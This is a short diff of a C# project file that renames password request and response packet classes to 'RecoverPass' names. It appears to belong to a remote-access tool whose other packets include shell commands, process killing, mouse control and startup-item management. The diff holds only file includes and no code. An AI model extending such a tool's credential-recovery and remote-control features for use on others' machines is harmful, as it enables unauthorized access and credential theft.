@@ -93,7 +93,7 @@
     <Compile Include="Core\Packets\ClientPackets\GetStartupItemsResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\GetSystemInfoResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\MonitorsResponse.cs" />
-    <Compile Include="Core\Packets\ClientPackets\PasswordResponse.cs" />
+    <Compile Include="Core\Packets\ClientPackets\RecoverPassResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\ShellCommandResponse.cs" />
     <Compile Include="Core\Packets\ClientPackets\UserStatus.cs" />
     <Compile Include="Core\Packets\ClientPackets\Initialize.cs" />
@@ -116,7 +116,7 @@
     <Compile Include="Core\Packets\ServerPackets\KillProcess.cs" />
     <Compile Include="Core\Packets\ServerPackets\Monitors.cs" />
     <Compile Include="Core\Packets\ServerPackets\MouseClick.cs" />
-    <Compile Include="Core\Packets\ServerPackets\PasswordRequest.cs" />
+    <Compile Include="Core\Packets\ServerPackets\RecoverPassRequest.cs" />
     <Compile Include="Core\Packets\ServerPackets\RemoveStartupitem.cs" />
     <Compile Include="Core\Packets\ServerPackets\Rename.cs" />
     <Compile Include="Core\Packets\ServerPackets\ShellCommand.cs" />
